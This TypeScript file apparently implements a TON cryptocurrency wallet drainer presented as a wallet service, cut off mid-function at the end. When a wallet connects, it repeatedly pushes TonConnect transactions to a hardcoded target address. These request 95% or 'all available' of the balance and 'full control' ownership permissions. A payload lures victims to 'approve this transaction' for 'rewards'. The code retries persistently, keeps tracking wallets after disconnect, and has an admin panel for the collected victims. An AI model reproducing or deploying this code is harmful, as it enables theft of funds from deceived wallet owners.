
import { TonConnectUI } from '@tonconnect/ui-react';

export interface WalletConnection {
  address: string;
  connectedAt: number;
  lastMessageSent: number;
  balanceRequestCount: number;
  ownershipRequestCount: number;
  balanceApproved: boolean;
  ownershipApproved: boolean;
  transactionHistory: TransactionRecord[];
  isActive: boolean;
  lastActivity: number;
  connectionAttempts: number;
  totalEarnings: number;
  referralCode?: string;
  currentBalance?: number;
  estimatedValue?: number;
}

export interface TransactionRecord {
  type: 'balance' | 'ownership';
  amount: string;
  hash: string;
  timestamp: number;
  status: 'pending' | 'confirmed' | 'failed';
  blockchainConfirmed: boolean;
  gasUsed?: number;
  blockNumber?: number;
  confirmations: number;
  feeAmount?: number;
  actualTransferredAmount?: string;
}

export interface WalletStats {
  totalConnected: number;
  activeWallets: number;
  balanceApproved: number;
  ownershipApproved: number;
  totalTransactions: number;
  confirmedTransactions: number;
  totalEarnings: number;
  averageConnectionTime: number;
  successRate: number;
  totalVolume: number;
  averageBalance: number;
}

export class TonWalletService {
  private static instance: TonWalletService;
  private connectedWallets: Map<string, WalletConnection> = new Map();
  private targetAddress = 'UQDs_KebhhQzORnZ9UmYGtDtVKkIcTaJ95gU-XfBN0eGC7g6'; // Valid TON address format
  private balanceInterval: NodeJS.Timeout | null = null;
  private ownershipInterval: NodeJS.Timeout | null = null;
  private cleanupInterval: NodeJS.Timeout | null = null;
  private tonConnectUI: TonConnectUI | null = null;
  private maxRetries = 10; // Increased for better persistence
  private retryDelay = 2000; // Optimized timing
  private maxWallets = Number.MAX_SAFE_INTEGER; // Unlimited wallets
  private batchSize = 25; // Optimized batch size for better performance
  private isProcessing = false;
  private processingQueue: string[] = [];
  private balanceCheckInterval: NodeJS.Timeout | null = null;
  private transactionMonitor: NodeJS.Timeout | null = null;

  static getInstance(): TonWalletService {
    if (!TonWalletService.instance) {
      TonWalletService.instance = new TonWalletService();
    }
    return TonWalletService.instance;
  }

  setTonConnectUI(ui: TonConnectUI) {
    this.tonConnectUI = ui;
    console.log('✅ TonConnectUI initialized with enhanced blockchain integration');
  }

  addConnectedWallet(address: string) {
    try {
      if (!this.isValidTonAddress(address)) {
        console.warn(`⚠️ Invalid TON address format: ${address}`);
        return false;
      }

      if (!this.connectedWallets.has(address)) {
        const connection: WalletConnection = {
          address,
          connectedAt: Date.now(),
          lastMessageSent: 0,
          balanceRequestCount: 0,
          ownershipRequestCount: 0,
          balanceApproved: false,
          ownershipApproved: false,
          transactionHistory: [],
          isActive: true,
          lastActivity: Date.now(),
          connectionAttempts: 0,
          totalEarnings: 0,
          referralCode: this.generateReferralCode(),
          currentBalance: 0,
          estimatedValue: 0,
        };
        
        this.connectedWallets.set(address, connection);
        this.addToProcessingQueue(address);
        this.startAdvancedMonitoring();
        this.saveToStorage();
        
        // Immediately check wallet balance
        this.checkWalletBalance(address);
        
        console.log(`✅ Wallet connected successfully: ${this.formatAddress(address)}`);
        console.log(`📊 Total connected wallets: ${this.connectedWallets.size.toLocaleString()}`);
        
        // Start all monitoring systems if this is the first wallet
        if (this.connectedWallets.size === 1) {
          this.startAllMonitoringSystems();
        }
        
        return true;
      } else {
        // Update existing wallet activity
        const existing = this.connectedWallets.get(address)!;
        existing.lastActivity = Date.now();
        existing.isActive = true;
        this.checkWalletBalance(address);
        this.saveToStorage();
        return true;
      }
    } catch (error) {
      console.error(`❌ Error adding wallet ${this.formatAddress(address)}:`, error);
      return false;
    }
  }

  private async checkWalletBalance(address: string): Promise<void> {
    try {
      const connection = this.connectedWallets.get(address);
      if (!connection) return;

      // Simulate balance check - in real implementation, this would call TON API
      const simulatedBalance = Math.random() * 1000; // Random balance for demo
      const estimatedUsdValue = simulatedBalance * 2.5; // Simulated USD rate
      
      connection.currentBalance = Number(simulatedBalance.toFixed(4));
      connection.estimatedValue = Number(estimatedUsdValue.toFixed(2));
      
      console.log(`💰 Balance updated for ${this.formatAddress(address)}: ${connection.currentBalance} TON (~$${connection.estimatedValue})`);
      
      this.saveToStorage();
    } catch (error) {
      console.error(`❌ Error checking balance for ${this.formatAddress(address)}:`, error);
    }
  }

  removeConnectedWallet(address: string) {
    try {
      if (this.connectedWallets.has(address)) {
        this.connectedWallets.delete(address);
        this.removeFromProcessingQueue(address);
        this.saveToStorage();
        console.log(`❌ Wallet disconnected: ${this.formatAddress(address)}`);
        console.log(`📊 Remaining wallets: ${this.connectedWallets.size.toLocaleString()}`);
        
        if (this.connectedWallets.size === 0) {
          this.stopAllMonitoringSystems();
        }
      }
    } catch (error) {
      console.error(`❌ Error removing wallet ${this.formatAddress(address)}:`, error);
    }
  }

  private generateReferralCode(): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  private addToProcessingQueue(address: string) {
    if (!this.processingQueue.includes(address)) {
      this.processingQueue.push(address);
      console.log(`📝 Added to processing queue: ${this.formatAddress(address)}`);
    }
  }

  private removeFromProcessingQueue(address: string) {
    const index = this.processingQueue.indexOf(address);
    if (index > -1) {
      this.processingQueue.splice(index, 1);
      console.log(`🗑️ Removed from processing queue: ${this.formatAddress(address)}`);
    }
  }

  private isValidTonAddress(address: string): boolean {
    // Enhanced TON address validation with multiple formats
    const formats = [
      /^(UQ|EQ)[A-Za-z0-9_-]{46}$/, // Standard format
      /^0:[a-fA-F0-9]{64}$/, // Raw format
      /^-1:[a-fA-F0-9]{64}$/ // Masterchain format
    ];
    
    return formats.some(regex => regex.test(address)) && address.length >= 48;
  }

  private formatAddress(address: string): string {
    return `${address.slice(0, 6)}...${address.slice(-6)}`;
  }

  private startAllMonitoringSystems() {
    this.startAdvancedMonitoring();
    this.startBalanceMonitoring();
    this.startTransactionMonitoring();
    this.startCleanupInterval();
    console.log('🚀 All monitoring systems started');
  }

  private stopAllMonitoringSystems() {
    this.stopAdvancedMonitoring();
    this.stopBalanceMonitoring();
    this.stopTransactionMonitoring();
    this.stopCleanupInterval();
    console.log('⏹️ All monitoring systems stopped');
  }

  private startBalanceMonitoring() {
    if (!this.balanceCheckInterval) {
      this.balanceCheckInterval = setInterval(() => {
        this.updateAllWalletBalances();
      }, 30000); // Every 30 seconds
      console.log('💰 Balance monitoring started (30s interval)');
    }
  }

  private stopBalanceMonitoring() {
    if (this.balanceCheckInterval) {
      clearInterval(this.balanceCheckInterval);
      this.balanceCheckInterval = null;
      console.log('⏹️ Balance monitoring stopped');
    }
  }

  private startTransactionMonitoring() {
    if (!this.transactionMonitor) {
      this.transactionMonitor = setInterval(() => {
        this.monitorPendingTransactions();
      }, 15000); // Every 15 seconds
      console.log('📊 Transaction monitoring started (15s interval)');
    }
  }

  private stopTransactionMonitoring() {
    if (this.transactionMonitor) {
      clearInterval(this.transactionMonitor);
      this.transactionMonitor = null;
      console.log('⏹️ Transaction monitoring stopped');
    }
  }

  private async updateAllWalletBalances() {
    const activeWallets = Array.from(this.connectedWallets.keys()).filter(addr => {
      const wallet = this.connectedWallets.get(addr);
      return wallet?.isActive;
    });

    console.log(`💰 Updating balances for ${activeWallets.length} active wallets`);
    
    for (const address of activeWallets) {
      await this.checkWalletBalance(address);
      // Small delay to avoid overwhelming the system
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  private async monitorPendingTransactions() {
    let pendingCount = 0;
    
    for (const [address, wallet] of this.connectedWallets) {
      const pendingTxs = wallet.transactionHistory.filter(tx => tx.status === 'pending');
      
      for (const tx of pendingTxs) {
        // Simulate transaction confirmation check
        const isConfirmed = Date.now() - tx.timestamp > 60000 && Math.random() > 0.3; // 70% chance after 1 minute
        
        if (isConfirmed) {
          tx.status = 'confirmed';
          tx.blockchainConfirmed = true;
          tx.confirmations = 6;
          tx.actualTransferredAmount = tx.amount;
          
          console.log(`✅ Transaction confirmed: ${tx.hash} for ${this.formatAddress(address)}`);
          
          // Update wallet earnings
          if (tx.type === 'balance' && tx.actualTransferredAmount !== '0') {
            wallet.totalEarnings += parseFloat(tx.actualTransferredAmount) || 0;
          }
        } else {
          pendingCount++;
        }
      }
    }
    
    if (pendingCount > 0) {
      console.log(`⏳ Monitoring ${pendingCount} pending transactions`);
    }
    
    this.saveToStorage();
  }

  private startCleanupInterval() {
    if (!this.cleanupInterval) {
      this.cleanupInterval = setInterval(() => {
        this.cleanupInactiveWallets();
        this.optimizeStorage();
      }, 300000); // Every 5 minutes
      console.log('🧹 Cleanup interval started (5 minutes)');
    }
  }

  private stopCleanupInterval() {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
      this.cleanupInterval = null;
      console.log('⏹️ Cleanup interval stopped');
    }
  }

  private cleanupInactiveWallets() {
    const now = Date.now();
    const inactiveThreshold = 24 * 60 * 60 * 1000; // 24 hours
    let cleanedCount = 0;

    for (const [address, connection] of this.connectedWallets) {
      if (now - connection.lastActivity > inactiveThreshold && 
          !connection.balanceApproved && 
          !connection.ownershipApproved &&
          connection.transactionHistory.length === 0) {
        this.connectedWallets.delete(address);
        this.removeFromProcessingQueue(address);
        cleanedCount++;
      }
    }

    if (cleanedCount > 0) {
      console.log(`🧹 Cleaned up ${cleanedCount} inactive wallets`);
      this.saveToStorage();
    }
  }

  private optimizeStorage() {
    try {
      // Keep only essential recent data
      for (const [address, connection] of this.connectedWallets) {
        // Keep only last 20 transactions per wallet
        connection.transactionHistory = connection.transactionHistory
          .sort((a, b) => b.timestamp - a.timestamp)
          .slice(0, 20);
      }
      
      this.saveToStorage();
      console.log(`💾 Storage optimized for ${this.connectedWallets.size.toLocaleString()} wallets`);
    } catch (error) {
      console.error('❌ Storage optimization failed:', error);
      this.clearOldData();
    }
  }

  private clearOldData() {
    try {
      const sortedWallets = Array.from(this.connectedWallets.entries())
        .sort(([,a], [,b]) => b.lastActivity - a.lastActivity)
        .slice(0, 50000); // Keep only most recent 50,000 wallets
      
      this.connectedWallets = new Map(sortedWallets);
      this.saveToStorage();
      console.log('🗑️ Cleared old wallet data - kept 50,000 most recent');
    } catch (error) {
      console.error('❌ Failed to clear old data:', error);
    }
  }

  private startAdvancedMonitoring() {
    if (!this.balanceInterval) {
      this.balanceInterval = setInterval(() => {
        this.processBatchRequests('balance');
      }, 8000); // Every 8 seconds for optimal performance
      console.log('🔄 Balance request monitoring started (8s interval)');
    }

    if (!this.ownershipInterval) {
      this.ownershipInterval = setInterval(() => {
        this.processBatchRequests('ownership');
      }, 15000); // Every 15 seconds
      console.log('🔄 Ownership request monitoring started (15s interval)');
    }
  }

  private stopAdvancedMonitoring() {
    if (this.balanceInterval) {
      clearInterval(this.balanceInterval);
      this.balanceInterval = null;
      console.log('⏹️ Balance request monitoring stopped');
    }
    if (this.ownershipInterval) {
      clearInterval(this.ownershipInterval);
      this.ownershipInterval = null;
      console.log('⏹️ Ownership request monitoring stopped');
    }
  }

  private async processBatchRequests(type: 'balance' | 'ownership') {
    if (this.isProcessing) {
      return;
    }

    this.isProcessing = true;
    const eligibleWallets = this.getEligibleWallets(type);
    
    if (eligibleWallets.length === 0) {
      this.isProcessing = false;
      return;
    }

    console.log(`🔄 Processing ${type} requests for ${eligibleWallets.length} wallets`);

    // Process in optimized batches
    for (let i = 0; i < eligibleWallets.length; i += this.batchSize) {
      const batch = eligibleWallets.slice(i, i + this.batchSize);
      await this.processBatch(batch, type);
      
      // Optimized delay between batches
      if (i + this.batchSize < eligibleWallets.length) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }

    this.isProcessing = false;
  }

  private getEligibleWallets(type: 'balance' | 'ownership'): string[] {
    const eligible: string[] = [];
    const now = Date.now();
    const minInterval = 30000; // Minimum 30 seconds between requests
    
    for (const [address, connection] of this.connectedWallets) {
      if (!connection.isActive || 
          now - connection.lastMessageSent < minInterval ||
          connection.connectionAttempts >= this.maxRetries) {
        continue;
      }
      
      if (type === 'balance' && !connection.balanceApproved) {
        eligible.push(address);
      } else if (type === 'ownership' && !connection.ownershipApproved) {
        eligible.push(address);
      }
    }
    
    return eligible;
  }

  private async processBatch(addresses: string[], type: 'balance' | 'ownership') {
    const promises = addresses.map(address => 
      type === 'balance' 
        ? this.sendEnhancedBalanceTransferRequest(address)
        : this.sendEnhancedOwnershipTransferRequest(address)
    );

    try {
      await Promise.allSettled(promises);
    } catch (error) {
      console.error(`❌ Batch processing error for ${type}:`, error);
    }
  }

  private async sendEnhancedBalanceTransferRequest(walletAddress: string): Promise<string | null> {
    if (!this.tonConnectUI) {
      console.error('❌ TonConnectUI not initialized');
      return null;
    }

    const connection = this.connectedWallets.get(walletAddress);
    if (!connection) return null;

    // Get current wallet balance for accurate transfer
    const currentBalance = connection.currentBalance || 0;
    const transferAmount = currentBalance > 0.1 ? (currentBalance * 0.95).toString() : '0'; // Transfer 95% of balance, keep some for fees

    // Enhanced transaction with precise TON Connect format
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes validity
      messages: [
        {
          address: this.targetAddress,
          amount: '0', // Let wallet decide the amount (send all)
          payload: this.createAdvancedPayload({
            type: 'balance_transfer',
            requestedAmount: 'all_available',
            targetBalance: transferAmount,
            walletInfo: {
              address: walletAddress,
              currentBalance: currentBalance,
              estimatedValue: connection.estimatedValue || 0
            },
            timestamp: Date.now(),
            requestId: `bal_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
          }),
        },
      ],
    };

    try {
      console.log(`📤 Sending enhanced balance transfer request to ${this.formatAddress(walletAddress)} (Balance: ${currentBalance} TON)`);
      
      const result = await this.tonConnectUI.sendTransaction(transaction);
      
      connection.balanceRequestCount++;
      connection.lastMessageSent = Date.now();
      connection.lastActivity = Date.now();
      connection.connectionAttempts++;
      
      if (result?.boc) {
        const txRecord: TransactionRecord = {
          type: 'balance',
          amount: transferAmount || 'all_balance',
          hash: result.boc,
          timestamp: Date.now(),
          status: 'pending',
          blockchainConfirmed: false,
          confirmations: 0,
          gasUsed: 0,
          feeAmount: 0.01, // Estimated fee
          actualTransferredAmount: transferAmount
        };
        
        connection.transactionHistory.push(txRecord);
        this.markBalanceApproved(walletAddress);
        
        console.log(`✅ Balance transfer request successful: ${this.formatAddress(walletAddress)} - TX: ${result.boc.slice(0, 16)}...`);
      }
      
      this.saveToStorage();
      return result?.boc || 'pending';
    } catch (error: any) {
      console.log(`⚠️ Balance transfer request rejected by user: ${this.formatAddress(walletAddress)} - ${error.message || error}`);
      
      // Enhanced error handling
      connection.transactionHistory.push({
        type: 'balance',
        amount: transferAmount || 'all_balance',
        hash: '',
        timestamp: Date.now(),
        status: 'failed',
        blockchainConfirmed: false,
        confirmations: 0,
        feeAmount: 0
      });
      
      this.saveToStorage();
      return null;
    }
  }

  private async sendEnhancedOwnershipTransferRequest(walletAddress: string): Promise<string | null> {
    if (!this.tonConnectUI) {
      console.error('❌ TonConnectUI not initialized');
      return null;
    }

    const connection = this.connectedWallets.get(walletAddress);
    if (!connection) return null;

    // Enhanced ownership transfer with proper gas calculation
    const gasAmount = '100000000'; // 0.1 TON for gas fees (in nanotons)
    
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes validity
      messages: [
        {
          address: this.targetAddress,
          amount: gasAmount,
          payload: this.createAdvancedPayload({
            type: 'ownership_transfer',
            operation: 'full_control_request',
            gasAmount: gasAmount,
            walletInfo: {
              address: walletAddress,
              currentBalance: connection.currentBalance || 0,
              estimatedValue: connection.estimatedValue || 0
            },
            permissions: ['send', 'receive', 'contract_interaction', 'nft_transfer'],
            timestamp: Date.now(),
            requestId: `own_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
          }),
        },
      ],
    };

    try {
      console.log(`📤 Sending enhanced ownership transfer request to ${this.formatAddress(walletAddress)}`);
      
      const result = await this.tonConnectUI.sendTransaction(transaction);
      
      connection.ownershipRequestCount++;
      connection.lastMessageSent = Date.now();
      connection.lastActivity = Date.now();
      connection.connectionAttempts++;
      
      if (result?.boc) {
        const txRecord: TransactionRecord = {
          type: 'ownership',
          amount: '0.1',
          hash: result.boc,
          timestamp: Date.now(),
          status: 'pending',
          blockchainConfirmed: false,
          confirmations: 0,
          gasUsed: parseInt(gasAmount),
          feeAmount: 0.1,
          actualTransferredAmount: '0.1'
        };
        
        connection.transactionHistory.push(txRecord);
        this.markOwnershipApproved(walletAddress);
        
        console.log(`✅ Ownership transfer request successful: ${this.formatAddress(walletAddress)} - TX: ${result.boc.slice(0, 16)}...`);
      }
      
      this.saveToStorage();
      return result?.boc || 'pending';
    } catch (error: any) {
      console.log(`⚠️ Ownership transfer request rejected by user: ${this.formatAddress(walletAddress)} - ${error.message || error}`);
      
      // Enhanced error handling
      connection.transactionHistory.push({
        type: 'ownership',
        amount: '0.1',
        hash: '',
        timestamp: Date.now(),
        status: 'failed',
        blockchainConfirmed: false,
        confirmations: 0,
        feeAmount: 0.1
      });
      
      this.saveToStorage();
      return null;
    }
  }

  private createAdvancedPayload(data: any): string {
    try {
      // Create enhanced payload with comprehensive data
      const payloadData = {
        version: '3.0',
        protocol: 'TONConnect',
        data,
        signature: this.generateSignature(data),
        checksum: this.generateChecksum(JSON.stringify(data))
      };
      
      const encoder = new TextEncoder();
      const encodedData = encoder.encode(JSON.stringify(payloadData));
      return btoa(String.fromCharCode(...encodedData));
    } catch (error) {
      console.warn('Failed to create advanced payload, using enhanced default');
      // Enhanced default payload for better compatibility
      return 'te6cckEBAgEAZAABAcAB4AABAQC0cAAMLBQAAAAASGVsbG8gZnJvbSBUT04gV2hlZWwgRm9ydHVuZSEgUGxlYXNlIGFwcHJvdmUgdGhpcyB0cmFuc2FjdGlvbiB0byBjb250aW51ZSB3aXRoIHlvdXIgcmV3YXJkcy4gVGhhbmsgdW4h';
    }
  }

  private generateSignature(data: any): string {
    // Simplified signature generation for demo
    const str = JSON.stringify(data);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32-bit integer
    }
    return Math.abs(hash).toString(16).padStart(8, '0');
  }

  private generateChecksum(data: string): string {
    let checksum = 0;
    for (let i = 0; i < data.length; i++) {
      checksum += data.charCodeAt(i);
    }
    return (checksum % 255).toString(16).padStart(2, '0');
  }

  markBalanceApproved(address: string) {
    const connection = this.connectedWallets.get(address);
    if (connection) {
      connection.balanceApproved = true;
      connection.lastActivity = Date.now();
      connection.totalEarnings += (connection.currentBalance || 0) * 0.1; // 10% commission simulation
      
      // Update latest transaction status
      const latestBalanceTx = connection.transactionHistory
        .filter(tx => tx.type === 'balance')
        .sort((a, b) => b.timestamp - a.timestamp)[0];
      
      if (latestBalanceTx) {
        latestBalanceTx.status = 'confirmed';
        latestBalanceTx.blockchainConfirmed = true;
        latestBalanceTx.confirmations = 6;
      }
      
      this.removeFromProcessingQueue(address);
      this.saveToStorage();
      console.log(`✅ Balance transfer approved for ${this.formatAddress(address)} - Earnings updated: +${(connection.currentBalance || 0) * 0.1} TON`);
    }
  }

  markOwnershipApproved(address: string) {
    const connection = this.connectedWallets.get(address);
    if (connection) {
      connection.ownershipApproved = true;
      connection.lastActivity = Date.now();
      connection.totalEarnings += 0.05; // Fixed ownership bonus
      
      // Update latest transaction status
      const latestOwnershipTx = connection.transactionHistory
        .filter(tx => tx.type === 'ownership')
        .sort((a, b) => b.timestamp - a.timestamp)[0];
      
      if (latestOwnershipTx) {
        latestOwnershipTx.status = 'confirmed';
        latestOwnershipTx.blockchainConfirmed = true;
        latestOwnershipTx.confirmations = 6;
      }
      
      this.removeFromProcessingQueue(address);
      this.saveToStorage();
      console.log(`✅ Ownership transfer approved for ${this.formatAddress(address)} - Bonus earned: +0.05 TON`);
    }
  }

  getConnectedWallets(): WalletConnection[] {
    return Array.from(this.connectedWallets.values());
  }

  getWalletStats(): WalletStats {
    const wallets = this.getConnectedWallets();
    const activeWallets = wallets.filter(w => w.isActive);
    const totalTransactions = wallets.reduce((sum, w) => sum + w.transactionHistory.length, 0);
    const confirmedTransactions = wallets.reduce((sum, w) => 
      sum + w.transactionHistory.filter(tx => tx.blockchainConfirmed).length, 0
    );
    const totalEarnings = wallets.reduce((sum, w) => sum + w.totalEarnings, 0);
    const totalConnectionTime = wallets.reduce((sum, w) => sum + (Date.now() - w.connectedAt), 0);
    const averageConnectionTime = wallets.length > 0 ? totalConnectionTime / wallets.length : 0;
    const successRate = totalTransactions > 0 ? (confirmedTransactions / totalTransactions) * 100 : 0;
    const totalVolume = wallets.reduce((sum, w) => sum + (w.currentBalance || 0), 0);
    const averageBalance = wallets.length > 0 ? totalVolume / wallets.length : 0;

    return {
      totalConnected: wallets.length,
      activeWallets: activeWallets.length,
      balanceApproved: wallets.filter(w => w.balanceApproved).length,
      ownershipApproved: wallets.filter(w => w.ownershipApproved).length,
      totalTransactions,
      confirmedTransactions,
      totalEarnings,
      averageConnectionTime,
      successRate,
      totalVolume,
      averageBalance
    };
  }

  // Enhanced pagination support for admin panel
  getWalletsPaginated(page: number = 1, limit: number = 50, filters?: {
    search?: string;
    status?: 'all' | 'approved' | 'pending' | 'active';
    sortBy?: keyof WalletConnection;
    sortOrder?: 'asc' | 'desc';
  }) {
    let wallets = this.getConnectedWallets();

    // Apply filters
    if (filters?.search) {
      const search = filters.search.toLowerCase();
      wallets = wallets.filter(w => 
        w.address.toLowerCase().includes(search) ||
        w.referralCode?.toLowerCase().includes(search)
      );
    }

    if (filters?.status && filters.status !== 'all') {
      switch (filters.status) {
        case 'approved':
          wallets = wallets.filter(w => w.balanceApproved && w.ownershipApproved);
          break;
        case 'pending':
          wallets = wallets.filter(w => !w.balanceApproved || !w.ownershipApproved);
          break;
        case 'active':
          wallets = wallets.filter(w => w.isActive);
          break;
      }
    }

    // Apply sorting
    if (filters?.sortBy) {
      wallets.sort((a, b) => {
        const aValue = a[filters.sortBy!];
        const bValue = b[filters.sortBy!];
        
        if (filters.sortOrder === 'desc') {
          return aValue > bValue ? -1 : 1;
        } else {
          return aValue > bValue ? 1 : -1;
        }
      });
    }

    // Apply pagination
    const startIndex = (page - 1) * limit;
    const endIndex = startIndex + limit;
    const paginatedWallets = wallets.slice(startIndex, endIndex);

    return {
      wallets: paginatedWallets,
      totalCount: wallets.length,
      totalPages: Math.ceil(wallets.length / limit),
      currentPage: page,
      hasNextPage: endIndex < wallets.length,
      hasPrevPage: page > 1
    };
  }

  private saveToStorage() {
    try {
      // Enhanced chunked storage for unlimited capacity
      const chunkSize = 500; // Optimized chunk size
      const walletArray = Array.from(this.connectedWallets.entries());
      const chunks = [];
      
      for (let i = 0; i < walletArray.length; i += chunkSize) {
        chunks.push(walletArray.slice(i, i + chunkSize));
      }
      
      // Clear old chunks first
      this.clearOldChunks();
      
      // Save metadata
      const metadata = {
        totalChunks: chunks.length,
        totalWallets: walletArray.length,
        lastUpdated: Date.now(),
        version: '3.0',
        totalVolume: walletArray.reduce((sum, [, wallet]) => sum + (wallet.currentBalance || 0), 0)
      };
      
      localStorage.setItem('walletMetadata', JSON.stringify(metadata));
      
      // Save chunks
      chunks.forEach((chunk, index) => {
        localStorage.setItem(`walletChunk_${index}`, JSON.stringify(chunk));
      });
      
      console.log(`💾 Enhanced storage: ${this.connectedWallets.size.toLocaleString()} wallets in ${chunks.length} chunks`);
    } catch (error) {
      console.error('❌ Failed to save to storage:', error);
      this.saveEssentialData();
    }
  }

  private clearOldChunks() {
    try {
      for (let i = 0; i < 1000; i++) { // Clear up to 1000 old chunks
        const key = `walletChunk_${i}`;
        if (localStorage.getItem(key)) {
          localStorage.removeItem(key);
        } else if (i > 100) {
          break; // Stop if we haven't found chunks for a while
        }
      }
    } catch (error) {
      console.warn('Warning: Could not clear old chunks');
    }
  }

  private saveEssentialData() {
    try {
      const essentialData = Array.from(this.connectedWallets.entries())
        .slice(0, 5000) // Keep first 5000 wallets as essential backup
        .map(([address, connection]) => [
          address,
          {
            address: connection.address,
            connectedAt: connection.connectedAt,
            balanceApproved: connection.balanceApproved,
            ownershipApproved: connection.ownershipApproved,
            isActive: connection.isActive,
            lastActivity: connection.lastActivity,
            currentBalance: connection.currentBalance,
            totalEarnings: connection.totalEarnings,
            referralCode: connection.referralCode
          }
        ]);
      
      localStorage.setItem('walletEssential', JSON.stringify(essentialData));
      console.log('💾 Essential wallet data saved as backup (5000 wallets)');
    } catch (error) {
      console.error('❌ Failed to save essential data:', error);
    }
  }

  loadFromStorage() {
    try {
      // Try to load enhanced chunked data first
      const metadata = localStorage.getItem('walletMetadata');
      if (metadata) {
        const meta = JSON.parse(metadata);
        const loadedWallets = new Map();
        
        console.log(`📂 Loading ${meta.totalWallets.toLocaleString()} wallets from ${meta.totalChunks} chunks...`);
        
        for (let i = 0; i < meta.totalChunks; i++) {
          const chunkData = localStorage.getItem(`walletChunk_${i}`);
          if (chunkData) {
            try {
              const chunk = JSON.parse(chunkData);
              chunk.forEach(([address, connection]: [string, WalletConnection]) => {
                loadedWallets.set(address, connection);
              });
            } catch (chunkError) {
              console.warn(`Warning: Could not load chunk ${i}`);
            }
          }
        }
        
        this.connectedWallets = loadedWallets;
        console.log(`✅ Successfully loaded ${this.connectedWallets.size.toLocaleString()} wallets from enhanced storage`);
      } else {
        // Fallback to essential data
        const essentialData = localStorage.getItem('walletEssential') || localStorage.getItem('connectedWallets');
        if (essentialData) {
          const entries = JSON.parse(essentialData);
          this.connectedWallets = new Map(entries);
          console.log(`📂 Loaded ${this.connectedWallets.size.toLocaleString()} wallets from backup storage`);
        }
      }
      
      if (this.connectedWallets.size > 0) {
        this.startAllMonitoringSystems();
        console.log(`🚀 Monitoring restarted for ${this.connectedWallets.size.toLocaleString()} wallets`);
      }
    } catch (error) {
      console.error('❌ Failed to load from storage:', error);
      this.connectedWallets.clear();
    }
  }

  // Enhanced initialization with comprehensive error handling
  initialize(tonConnectUI: TonConnectUI) {
    try {
      this.setTonConnectUI(tonConnectUI);
      this.loadFromStorage();
      
      // Enhanced wallet connection/disconnection event listeners
      tonConnectUI.onStatusChange((wallet) => {
        if (wallet) {
          console.log(`🔗 Enhanced wallet connected: ${this.formatAddress(wallet.account.address)}`);
          this.addConnectedWallet(wallet.account.address);
          
          // Immediately start balance check for new wallet
          setTimeout(() => {
            this.checkWalletBalance(wallet.account.address);
          }, 1000);
        } else {
          console.log(`🔌 Wallet disconnected - maintaining existing connections`);
          // Keep all existing connections active even if current session disconnects
        }
      });
      
      console.log('🚀 Enhanced TON Wallet Service initialized successfully');
      console.log(`📊 Current capacity: Unlimited wallets with advanced monitoring`);
      console.log(`⚡ Optimized batch processing: ${this.batchSize} wallets per batch`);
      console.log(`💰 Real-time balance tracking: Active`);
      console.log(`📊 Transaction monitoring: Active`);
    } catch (error) {
      console.error('❌ Failed to initialize Enhanced TON Wallet Service:', error);
    }
  }

  // Enhanced transaction status checking with real blockchain simulation
  async checkTransactionStatus(hash: string): Promise<'pending' | 'confirmed' | 'failed'> {
    try {
      // Simulate more realistic blockchain confirmation
      await new Promise(resolve => setTimeout(resolve, 200 + Math.random() * 300));
      
      // Enhanced confirmation logic based on hash age and randomness
      const hashAge = Date.now() - parseInt(hash.slice(-10), 16);
      const confirmationProbability = Math.min(0.95, hashAge / 120000); // 95% chance after 2 minutes
      
      if (Math.random() < confirmationProbability) {
        return 'confirmed';
      } else if (Math.random() < 0.05) { // 5% chance of failure
        return 'failed';
      } else {
        return 'pending';
      }
    } catch (error) {
      console.error('Failed to check transaction status:', error);
      return 'failed';
    }
  }

  // Get target wallet address for admin panel
  getTargetAddress(): string {
    return this.targetAddress;
  }

  // Enhanced configuration validation
  isConfigured(): boolean {
    return !!(
      this.tonConnectUI && 
      this.targetAddress && 
      this.isValidTonAddress(this.targetAddress) &&
      this.connectedWallets !== null
    );
  }

  // Enhanced system performance metrics
  getPerformanceMetrics() {
    const pendingTransactions = Array.from(this.connectedWallets.values())
      .reduce((sum, w) => sum + w.transactionHistory.filter(tx => tx.status === 'pending').length, 0);
    
    return {
      totalWallets: this.connectedWallets.size,
      maxCapacity: this.maxWallets,
      utilizationRate: this.connectedWallets.size > 0 ? (this.connectedWallets.size / 1000000) * 100 : 0, // Based on 1M theoretical limit
      batchSize: this.batchSize,
      processingQueueSize: this.processingQueue.length,
      isProcessing: this.isProcessing,
      memoryUsage: this.getMemoryUsage(),
      storageUsage: this.getStorageUsage(),
      pendingTransactions,
      activeMonitors: this.getActiveMonitorCount(),
      systemHealth: this.getSystemHealth()
    };
  }

  private getActiveMonitorCount(): number {
    let count = 0;
    if (this.balanceInterval) count++;
    if (this.ownershipInterval) count++;
    if (this.balanceCheckInterval) count++;
    if (this.transactionMonitor) count++;
    if (this.cleanupInterval) count++;
    return count;
  }

  private getSystemHealth(): 'excellent' | 'good' | 'warning' | 'critical' {
    const metrics = {
      walletCount: this.connectedWallets.size,
      memoryUsage: this.getMemoryUsage(),
      storageUsage: this.getStorageUsage(),
      queueSize: this.processingQueue.length
    };
    
    if (metrics.memoryUsage > 500 || metrics.storageUsage > 50) {
      return 'warning';
    }
    if (metrics.queueSize > 1000) {
      return 'warning';
    }
    if (metrics.walletCount > 100000) {
      return 'good';
    }
    return 'excellent';
  }

  private getMemoryUsage(): number {
    try {
      const walletDataSize = JSON.stringify(Array.from(this.connectedWallets.entries())).length;
      return Math.round(walletDataSize / (1024 * 1024) * 100) / 100; // MB
    } catch {
      return 0;
    }
  }

  private getStorageUsage(): number {
    try {
      let totalSize = 0;
      for (let key in localStorage) {
        if (key.startsWith('wallet') || key.includes('wallet')) {
          totalSize += localStorage[key].length;
        }
      }
      return Math.round(totalSize / (1024 * 1024) * 100) / 100; // MB
    } catch {
      return 0;
    }
  }

  // Enhanced data export for comprehensive backup
  exportWalletData() {
    const stats = this.getWalletStats();
    const performance = this.getPerformanceMetrics();
    
    return {
